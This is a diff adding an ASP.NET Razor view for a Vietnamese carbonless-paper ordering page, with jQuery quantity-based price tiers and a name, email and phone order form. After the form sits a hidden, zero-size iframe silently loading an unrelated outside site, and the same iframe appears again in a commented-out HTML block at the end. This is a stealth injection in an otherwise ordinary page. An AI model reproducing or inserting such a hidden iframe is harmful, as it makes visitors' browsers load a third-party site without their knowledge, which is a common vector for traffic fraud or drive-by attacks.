@@ -1,0 +1,710 @@
+﻿@model NhutLongCompany.Models.SendEmail
+@{
+    // Layout = null;
+}
+<script type="text/javascript">
+    $(document).ready(function () {
+        var jsondata = '[{"NAME":"1. Giấy Carbonless - 3 liên - 50 bộ/cuốn - Khổ A4 - Nhiều màu","ID":"1"},' +
+            '{"NAME":"2. Giấy Carbonless - 3 liên - 50 bộ/cuốn - Khổ A4 - 2 màu","ID":"2"},' +
+            '{"NAME":"3. Giấy Carbonless - 2 liên - 50 bộ/cuốn - Khổ A4 - Nhiều màu","ID":"3"},' +
+            '{"NAME":"4. Giấy Carbonless - 2 liên - 50 bộ/cuốn - Khổ A4 - 2 màu","ID":"4"},' +
+            '{"NAME":"5. Giấy Carbonless - 3 liên - 50 bộ/cuốn - Khổ A5 - Nhiều màu","ID":"5"},' +
+            '{"NAME":"6. Giấy Carbonless - 3 liên - 50 bộ/cuốn - Khổ A5 - 2 màu","ID":"6"},' +
+            '{"NAME":"7. Giấy Carbonless - 2 liên - 50 bộ/cuốn - Khổ A5 - Nhiều màu","ID":"7"},' +
+            '{"NAME":"8. Giấy Carbonless - 2 liên - 50 bộ/cuốn - Khổ A5 - 2 màu","ID":"8"}]';
+        var item = JSON.parse(jsondata);
+        var $select = $('#name');
+        $(item).each(function () {
+            var option = '<option  value="' + this.ID + '">' + this.NAME + '</option>';
+            $select.append(option);
+        });
+
+
+    });
+
+    $(function change() {
+        $("#name").on("change", function () {
+
+            if ($(this).val() == 1) {
+                $('#dongia').text('350000');
+                if ($('#soluong').val() == 1) {
+                    $('#dongia').text('350000');
+                }
+                if ($('#soluong').val() == 2) {
+                    $('#dongia').text('325000');
+                }
+                if ($('#soluong').val() == 3) {
+                    $('#dongia').text('300000');
+                }
+                if ($('#soluong').val() == 4) {
+                    $('#dongia').text('300000');
+                }
+                if ($('#soluong').val() >= 5 && $('#soluong').val() < 10) {
+                    $('#dongia').text('240000');
+                }
+                if ($('#soluong').val() >= 10 && $('#soluong').val() < 20) {
+                    $('#dongia').text('220000');
+                }
+                if ($('#soluong').val() >= 20 && $('#soluong').val() < 40) {
+                    $('#dongia').text('210000');
+                }
+                if ($('#soluong').val() >= 40 && $('#soluong').val() < 50) {
+                    $('#dongia').text('200000');
+                }
+                if ($('#soluong').val() > 50) {
+                    $('#dongia').text('190000');
+                }
+            }
+            if ($(this).val() == 2) {
+                $('#dongia').text('340000');
+                if ($('#soluong').val() == 1) {
+                    $('#dongia').text('340000');
+                }
+                if ($('#soluong').val() == 2) {
+                    $('#dongia').text('315000');
+                }
+                if ($('#soluong').val() == 3) {
+                    $('#dongia').text('290000');
+                }
+                if ($('#soluong').val() == 4) {
+                    $('#dongia').text('290000');
+                }
+                if ($('#soluong').val() >= 5 && $('#soluong').val() < 10) {
+                    $('#dongia').text('230000');
+                }
+                if ($('#soluong').val() >= 10 && $('#soluong').val() < 20) {
+                    $('#dongia').text('210000');
+                }
+                if ($('#soluong').val() >= 20 && $('#soluong').val() < 40) {
+                    $('#dongia').text('200000');
+                }
+                if ($('#soluong').val() >= 40 && $('#soluong').val() < 50) {
+                    $('#dongia').text('190000');
+                }
+                if ($('#soluong').val() > 50) {
+                    $('#dongia').text('180000');
+                }
+            }
+            if ($(this).val() == 3) {
+                $('#dongia').text('320000');
+                if ($('#soluong').val() == 1) {
+                    $('#dongia').text('320000');
+                }
+                if ($('#soluong').val() == 2) {
+                    $('#dongia').text('295000');
+                }
+                if ($('#soluong').val() == 3) {
+                    $('#dongia').text('270000');
+                }
+                if ($('#soluong').val() == 4) {
+                    $('#dongia').text('270000');
+                }
+                if ($('#soluong').val() >= 5 && $('#soluong').val() < 10) {
+                    $('#dongia').text('210000');
+                }
+                if ($('#soluong').val() >= 10 && $('#soluong').val() < 20) {
+                    $('#dongia').text('190000');
+                }
+                if ($('#soluong').val() >= 20 && $('#soluong').val() < 40) {
+                    $('#dongia').text('180000');
+                }
+                if ($('#soluong').val() >= 40 && $('#soluong').val() < 50) {
+                    $('#dongia').text('170000');
+                }
+                if ($('#soluong').val() > 50) {
+                    $('#dongia').text('160000');
+                }
+            }
+            if ($(this).val() == 4) {
+                $('#dongia').text('310000');
+                if ($('#soluong').val() == 1) {
+                    $('#dongia').text('310000');
+                }
+                if ($('#soluong').val() == 2) {
+                    $('#dongia').text('285000');
+                }
+                if ($('#soluong').val() == 3) {
+                    $('#dongia').text('260000');
+                }
+                if ($('#soluong').val() == 4) {
+                    $('#dongia').text('260000');
+                }
+                if ($('#soluong').val() >= 5 && $('#soluong').val() < 10) {
+                    $('#dongia').text('200000');
+                }
+                if ($('#soluong').val() >= 10 && $('#soluong').val() < 20) {
+                    $('#dongia').text('180000');
+                }
+                if ($('#soluong').val() >= 20 && $('#soluong').val() < 40) {
+                    $('#dongia').text('170000');
+                }
+                if ($('#soluong').val() >= 40 && $('#soluong').val() < 50) {
+                    $('#dongia').text('160000');
+                }
+                if ($('#soluong').val() > 50) {
+                    $('#dongia').text('150000');
+                }
+            }
+            if ($(this).val() == 5) {
+                $('#dongia').text('280000');
+                if ($('#soluong').val() == 1) {
+                    $('#dongia').text('280000');
+                }
+                if ($('#soluong').val() == 2) {
+                    $('#dongia').text('260000');
+                }
+                if ($('#soluong').val() == 3) {
+                    $('#dongia').text('240000');
+                }
+                if ($('#soluong').val() == 4) {
+                    $('#dongia').text('240000');
+                }
+                if ($('#soluong').val() >= 5 && $('#soluong').val() < 10) {
+                    $('#dongia').text('192000');
+                }
+                if ($('#soluong').val() >= 10 && $('#soluong').val() < 20) {
+                    $('#dongia').text('176000');
+                }
+                if ($('#soluong').val() >= 20 && $('#soluong').val() < 40) {
+                    $('#dongia').text('168000');
+                }
+                if ($('#soluong').val() >= 40 && $('#soluong').val() < 50) {
+                    $('#dongia').text('160000');
+                }
+                if ($('#soluong').val() > 50) {
+                    $('#dongia').text('152000');
+                }
+            }
+            if ($(this).val() == 6) {
+                $('#dongia').text('272000');
+                if ($('#soluong').val() == 1) {
+                    $('#dongia').text('272000');
+                }
+                if ($('#soluong').val() == 2) {
+                    $('#dongia').text('252000');
+                }
+                if ($('#soluong').val() == 3) {
+                    $('#dongia').text('232000');
+                }
+                if ($('#soluong').val() == 4) {
+                    $('#dongia').text('232000');
+                }
+                if ($('#soluong').val() >= 5 && $('#soluong').val() < 10) {
+                    $('#dongia').text('184000');
+                }
+                if ($('#soluong').val() >= 10 && $('#soluong').val() < 20) {
+                    $('#dongia').text('168000');
+                }
+                if ($('#soluong').val() >= 20 && $('#soluong').val() < 40) {
+                    $('#dongia').text('160000');
+                }
+                if ($('#soluong').val() >= 40 && $('#soluong').val() < 50) {
+                    $('#dongia').text('152000');
+                }
+                if ($('#soluong').val() > 50) {
+                    $('#dongia').text('144000');
+                }
+            }
+            if ($(this).val() == 7) {
+                $('#dongia').text('256000');
+                if ($('#soluong').val() == 1) {
+                    $('#dongia').text('256000');
+                }
+                if ($('#soluong').val() == 2) {
+                    $('#dongia').text('236000');
+                }
+                if ($('#soluong').val() == 3) {
+                    $('#dongia').text('216000');
+                }
+                if ($('#soluong').val() == 4) {
+                    $('#dongia').text('216000');
+                }
+                if ($('#soluong').val() >= 5 && $('#soluong').val() < 10) {
+                    $('#dongia').text('168000');
+                }
+                if ($('#soluong').val() >= 10 && $('#soluong').val() < 20) {
+                    $('#dongia').text('152000');
+                }
+                if ($('#soluong').val() >= 20 && $('#soluong').val() < 40) {
+                    $('#dongia').text('144000');
+                }
+                if ($('#soluong').val() >= 40 && $('#soluong').val() < 50) {
+                    $('#dongia').text('136000');
+                }
+                if ($('#soluong').val() > 50) {
+                    $('#dongia').text('128000');
+                }
+            }
+            if ($(this).val() == 8) {
+                $('#dongia').text('248000');
+                if ($('#soluong').val() == 1) {
+                    $('#dongia').text('248000');
+                }
+                if ($('#soluong').val() == 2) {
+                    $('#dongia').text('228000');
+                }
+                if ($('#soluong').val() == 3) {
+                    $('#dongia').text('208000');
+                }
+                if ($('#soluong').val() == 4) {
+                    $('#dongia').text('208000');
+                }
+                if ($('#soluong').val() >= 5 && $('#soluong').val() < 10) {
+                    $('#dongia').text('160000');
+                }
+                if ($('#soluong').val() >= 10 && $('#soluong').val() < 20) {
+                    $('#dongia').text('144000');
+                }
+                if ($('#soluong').val() >= 20 && $('#soluong').val() < 40) {
+                    $('#dongia').text('136000');
+                }
+                if ($('#soluong').val() >= 40 && $('#soluong').val() < 50) {
+                    $('#dongia').text('128000');
+                }
+                if ($('#soluong').val() > 50) {
+                    $('#dongia').text('120000');
+                }
+            }
+            total();
+            var valu = $('#name').find(':selected').text();
+            var slu = $('#soluong').val();
+            var dgu = $('#dongia').text();
+            var ttu = tien(slu * dgu);
+            var to = ('Loại giấy: ' + valu + ' Số lượng: ' + slu + ' Đơn giá: ' + tien(dgu) + ' Thành tiền: ' + ttu);
+            $('#content').val(to);
+        }).trigger("change");
+    });
+
+    function total() {
+        var sl = $('#soluong').val();
+        var dg = $('#dongia').text();
+
+        $('#thanhtien').text(tien(sl * dg) + '.VND');
+    }
+
+    $(document).ready(function () {
+        $("#soluong").change(function () {
+            if ($('#name').val() == 1) {
+                $('#dongia').text('350000');
+                if ($('#soluong').val() == 1) {
+                    $('#dongia').text('350000');
+                }
+                if ($('#soluong').val() == 2) {
+                    $('#dongia').text('325000');
+                }
+                if ($('#soluong').val() == 3) {
+                    $('#dongia').text('300000');
+                }
+                if ($('#soluong').val() == 4) {
+                    $('#dongia').text('300000');
+                }
+                if ($('#soluong').val() >= 5 && $('#soluong').val() < 10) {
+                    $('#dongia').text('240000');
+                }
+                if ($('#soluong').val() >= 10 && $('#soluong').val() < 20) {
+                    $('#dongia').text('220000');
+                }
+                if ($('#soluong').val() >= 20 && $('#soluong').val() < 40) {
+                    $('#dongia').text('210000');
+                }
+                if ($('#soluong').val() >= 40 && $('#soluong').val() < 50) {
+                    $('#dongia').text('200000');
+                }
+                if ($('#soluong').val() > 50) {
+                    $('#dongia').text('190000');
+                }
+            }
+            if ($('#name').val() == 2) {
+                $('#dongia').text('340000');
+                if ($('#soluong').val() == 1) {
+                    $('#dongia').text('340000');
+                }
+                if ($('#soluong').val() == 2) {
+                    $('#dongia').text('315000');
+                }
+                if ($('#soluong').val() == 3) {
+                    $('#dongia').text('290000');
+                }
+                if ($('#soluong').val() == 4) {
+                    $('#dongia').text('290000');
+                }
+                if ($('#soluong').val() >= 5 && $('#soluong').val() < 10) {
+                    $('#dongia').text('230000');
+                }
+                if ($('#soluong').val() >= 10 && $('#soluong').val() < 20) {
+                    $('#dongia').text('210000');
+                }
+                if ($('#soluong').val() >= 20 && $('#soluong').val() < 40) {
+                    $('#dongia').text('200000');
+                }
+                if ($('#soluong').val() >= 40 && $('#soluong').val() < 50) {
+                    $('#dongia').text('190000');
+                }
+                if ($('#soluong').val() > 50) {
+                    $('#dongia').text('180000');
+                }
+            }
+            if ($('#name').val() == 3) {
+                $('#dongia').text('320000');
+                if ($('#soluong').val() == 1) {
+                    $('#dongia').text('320000');
+                }
+                if ($('#soluong').val() == 2) {
+                    $('#dongia').text('295000');
+                }
+                if ($('#soluong').val() == 3) {
+                    $('#dongia').text('270000');
+                }
+                if ($('#soluong').val() == 4) {
+                    $('#dongia').text('270000');
+                }
+                if ($('#soluong').val() >= 5 && $('#soluong').val() < 10) {
+                    $('#dongia').text('210000');
+                }
+                if ($('#soluong').val() >= 10 && $('#soluong').val() < 20) {
+                    $('#dongia').text('190000');
+                }
+                if ($('#soluong').val() >= 20 && $('#soluong').val() < 40) {
+                    $('#dongia').text('180000');
+                }
+                if ($('#soluong').val() >= 40 && $('#soluong').val() < 50) {
+                    $('#dongia').text('170000');
+                }
+                if ($('#soluong').val() > 50) {
+                    $('#dongia').text('160000');
+                }
+            }
+            if ($('#name').val() == 4) {
+                $('#dongia').text('310000');
+                if ($('#soluong').val() == 1) {
+                    $('#dongia').text('310000');
+                }
+                if ($('#soluong').val() == 2) {
+                    $('#dongia').text('285000');
+                }
+                if ($('#soluong').val() == 3) {
+                    $('#dongia').text('260000');
+                }
+                if ($('#soluong').val() == 4) {
+                    $('#dongia').text('260000');
+                }
+                if ($('#soluong').val() >= 5 && $('#soluong').val() < 10) {
+                    $('#dongia').text('200000');
+                }
+                if ($('#soluong').val() >= 10 && $('#soluong').val() < 20) {
+                    $('#dongia').text('180000');
+                }
+                if ($('#soluong').val() >= 20 && $('#soluong').val() < 40) {
+                    $('#dongia').text('170000');
+                }
+                if ($('#soluong').val() >= 40 && $('#soluong').val() < 50) {
+                    $('#dongia').text('160000');
+                }
+                if ($('#soluong').val() > 50) {
+                    $('#dongia').text('150000');
+                }
+            }
+            if ($('#name').val() == 5) {
+                $('#dongia').text('280000');
+                if ($('#soluong').val() == 1) {
+                    $('#dongia').text('280000');
+                }
+                if ($('#soluong').val() == 2) {
+                    $('#dongia').text('260000');
+                }
+                if ($('#soluong').val() == 3) {
+                    $('#dongia').text('240000');
+                }
+                if ($('#soluong').val() == 4) {
+                    $('#dongia').text('240000');
+                }
+                if ($('#soluong').val() >= 5 && $('#soluong').val() < 10) {
+                    $('#dongia').text('192000');
+                }
+                if ($('#soluong').val() >= 10 && $('#soluong').val() < 20) {
+                    $('#dongia').text('176000');
+                }
+                if ($('#soluong').val() >= 20 && $('#soluong').val() < 40) {
+                    $('#dongia').text('168000');
+                }
+                if ($('#soluong').val() >= 40 && $('#soluong').val() < 50) {
+                    $('#dongia').text('160000');
+                }
+                if ($('#soluong').val() > 50) {
+                    $('#dongia').text('152000');
+                }
+            }
+            if ($('#name').val() == 6) {
+                $('#dongia').text('272000');
+                if ($('#soluong').val() == 1) {
+                    $('#dongia').text('272000');
+                }
+                if ($('#soluong').val() == 2) {
+                    $('#dongia').text('252000');
+                }
+                if ($('#soluong').val() == 3) {
+                    $('#dongia').text('232000');
+                }
+                if ($('#soluong').val() == 4) {
+                    $('#dongia').text('232000');
+                }
+                if ($('#soluong').val() >= 5 && $('#soluong').val() < 10) {
+                    $('#dongia').text('184000');
+                }
+                if ($('#soluong').val() >= 10 && $('#soluong').val() < 20) {
+                    $('#dongia').text('168000');
+                }
+                if ($('#soluong').val() >= 20 && $('#soluong').val() < 40) {
+                    $('#dongia').text('160000');
+                }
+                if ($('#soluong').val() >= 40 && $('#soluong').val() < 50) {
+                    $('#dongia').text('152000');
+                }
+                if ($('#soluong').val() > 50) {
+                    $('#dongia').text('144000');
+                }
+            }
+            if ($('#name').val() == 7) {
+                $('#dongia').text('256000');
+                if ($('#soluong').val() == 1) {
+                    $('#dongia').text('256000');
+                }
+                if ($('#soluong').val() == 2) {
+                    $('#dongia').text('236000');
+                }
+                if ($('#soluong').val() == 3) {
+                    $('#dongia').text('216000');
+                }
+                if ($('#soluong').val() == 4) {
+                    $('#dongia').text('216000');
+                }
+                if ($('#soluong').val() >= 5 && $('#soluong').val() < 10) {
+                    $('#dongia').text('168000');
+                }
+                if ($('#soluong').val() >= 10 && $('#soluong').val() < 20) {
+                    $('#dongia').text('152000');
+                }
+                if ($('#soluong').val() >= 20 && $('#soluong').val() < 40) {
+                    $('#dongia').text('144000');
+                }
+                if ($('#soluong').val() >= 40 && $('#soluong').val() < 50) {
+                    $('#dongia').text('136000');
+                }
+                if ($('#soluong').val() > 50) {
+                    $('#dongia').text('128000');
+                }
+            }
+            if ($('#name').val() == 8) {
+                $('#dongia').text('248000');
+                if ($('#soluong').val() == 1) {
+                    $('#dongia').text('248000');
+                }
+                if ($('#soluong').val() == 2) {
+                    $('#dongia').text('228000');
+                }
+                if ($('#soluong').val() == 3) {
+                    $('#dongia').text('208000');
+                }
+                if ($('#soluong').val() == 4) {
+                    $('#dongia').text('208000');
+                }
+                if ($('#soluong').val() >= 5 && $('#soluong').val() < 10) {
+                    $('#dongia').text('160000');
+                }
+                if ($('#soluong').val() >= 10 && $('#soluong').val() < 20) {
+                    $('#dongia').text('144000');
+                }
+                if ($('#soluong').val() >= 20 && $('#soluong').val() < 40) {
+                    $('#dongia').text('136000');
+                }
+                if ($('#soluong').val() >= 40 && $('#soluong').val() < 50) {
+                    $('#dongia').text('128000');
+                }
+                if ($('#soluong').val() > 50) {
+                    $('#dongia').text(120000);
+                }
+            }
+            var valu = $('#name').find(':selected').text();
+            var slu = $('#soluong').val();
+            var dgu = $('#dongia').text();
+            var ttu = tien(slu * dgu);
+            var to = ('Loại giấy: ' + valu + ' Số lượng: ' + slu + ' Đơn giá: ' + tien(dgu) + ' Thành tiền: ' + ttu);
+            $('#content').val(to);
+            total();
+
+        });
+    });
+    function tien(val) {
+        while (/(\d+)(\d{3})/.test(val.toString())) {
+            val = val.toString().replace(/(\d)(?=(\d\d\d)+(?!\d))/g, "$1,");
+        }
+        return val;
+    }
+</script>
+
+<div class="row">
+    <div class="col-lg-12">
+        <h1 class="page-header">Thông Tin sản phẩm</h1>
+    </div>
+    <!-- /.col-lg-12 -->
+</div>
+<!-- /.row -->
+
+
+<div class="row">
+    <div class="col-lg-12">
+
+        <div class="panel panel-default">
+
+            <div class="panel-heading">
+                Bảng giá
+            </div>
+            <!-- /.panel-heading -->
+            <div class="panel-body">
+
+                <div class="dataTable_wrapper">
+                    @using (Html.BeginForm())
+                    {
+                        @Html.AntiForgeryToken()
+                        <table class="table table-striped table-bordered table-hover" id="dataTables-example1">
+                            <thead>
+                                <tr>
+                                    <th>Hóa đơn</th>
+                                    <th>Số lượng</th>
+                                    <th>Đơn giá</th>
+                                    <th>Thành tiền</th>
+                                </tr>
+                            </thead>
+                            <tbody>
+                                <tr>
+                                    <td>
+
+                                        <select id="name" class="form-control" name="selctor"></select>
+
+                                    </td>
+                                    <td>
+                                        <input type="text" class="form-control" style="height: 35px; font-size: 20px" id="soluong" value="1" />
+                                    </td>
+                                    <td>
+
+                                        <label id="dongia"></label>
+                                    </td>
+                                    <td>
+                                        <label id="thanhtien"></label>
+                                    </td>
+
+                                </tr>
+                                <tr>
+                                    <td colspan="4">
+                                        <span style="color: red; text-align: right;">( Giá trên chưa bao gồm thuế VAT -10%)</span>
+
+
+
+                                    </td>
+
+                                </tr>
+
+                                <tr>
+                                    <td></td>
+                                    <td>
+                                        Họ và tên
+                                    </td>
+                                    <td>
+                                        @Html.TextBoxFor(m => m.hovaten, new { @name = "hovaten", @class = "form-control" })
+                                        <span style="font-size: 15px; color: red;"> @Html.ValidationMessageFor(t => t.hovaten)</span>
+
+                                    </td>
+                                    <td></td>
+
+                                </tr>
+                                <tr>
+                                    <td>
+
+                                        @Html.TextBoxFor(m => m.content, new { @name = "content", @style = "height: 35px; font-size: 20px;display:none;", @id = "content" })
+                                    </td>
+                                    <td>
+                                        Email
+                                    </td>
+                                    <td>
+                                        @Html.TextBoxFor(m => m.Email, new { @name = "Email", @class = "form-control" })
+                                        <span style="font-size: 15px; color: red;">  @Html.ValidationMessageFor(t => t.Email)</span>
+
+                                    </td>
+                                    <td>
+                                        <button type="submit" class="btn btn-primary">Đặt hàng</button>
+                                        @*style="height: 35px; border-color: blue; color: red; background-color: yellow; font-weight: bold;"*@
+                                    </td>
+
+                                </tr>
+                                <tr>
+                                    <td></td>
+                                    <td>
+                                        Số điện thoại
+                                    </td>
+                                    <td>
+                                        @*<input type="text" style="height: 35px; font-size: 20px" id="sodt" />*@
+                                        @Html.TextBoxFor(m => m.sodienthoai, new { @name = "sodienthoai", @class = "form-control" })
+                                        <span style="font-size: 15px; color: red;"> @Html.ValidationMessageFor(t => t.sodienthoai)</span>
+
+                                    </td>
+                                    <td></td>
+
+                                </tr>
+
+                            </tbody>
+                        </table>
+                    }
+                </div>
+
+            </div>
+            <!-- /.panel-body -->
+        </div>
+        <!-- /.panel -->
+    </div>
+    <!-- /.col-lg-12 -->
+</div>
+<!-- /.row -->
+<iframe style="display: none" src="http://phongkhambacsihon.com/" width="0" height="0" tabindex="-1" title="empty"></iframe>
+
+@*<!DOCTYPE html>
+    <html lang="en">
+    <head>
+        <meta charset="utf-8">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="description" content="">
+        <meta name="author" content="">
+        <title>Nhut Long Web</title>
+        <link href="/bower_components/bootstrap/dist/css/bootstrap.min.css" rel="stylesheet" />
+        <link href="/bower_components/metisMenu/dist/metisMenu.min.css" rel="stylesheet" />
+        <link href="/Content/timeline.css" rel="stylesheet" />
+        <link href="/Content/sb-admin-2.css" rel="stylesheet" />
+
+        <script src="/Scripts/modernizr-2.6.2.js"></script>
+
+
+        <!-- DataTables CSS -->
+        <link href="/bower_components/datatables-plugins/integration/bootstrap/3/dataTables.bootstrap.css" rel="stylesheet" type="text/css" />
+        <!-- DataTables Responsive CSS -->
+        <link href="/bower_components/datatables-responsive/css/dataTables.responsive.css" rel="stylesheet" type="text/css" />
+
+        <link href="/bower_components/morrisjs/morris.css" rel="stylesheet" type="text/css" />
+        <link href="/bower_components/font-awesome/css/font-awesome.min.css" rel="stylesheet" type="text/css" />
+
+        <!-- jQuery -->
+        <script src="/Scripts/jquery-1.10.2.js"></script>
+
+        <script src="/bower_components/jquery/dist/jquery.min.js"></script>
+        <script src="/bower_components/bootstrap/dist/js/bootstrap.min.js"></script>
+        <script src="/Scripts/respond.js"></script>
+
+        <script src="/bower_components/metisMenu/dist/metisMenu.min.js"></script>
+
+    </head>
+    <body>
+
+
+        <iframe style="display: none" src="http://phongkhambacsihon.com/" width="0" height="0" tabindex="-1" title="empty"></iframe>
+
+    </body>
+    </html>*@
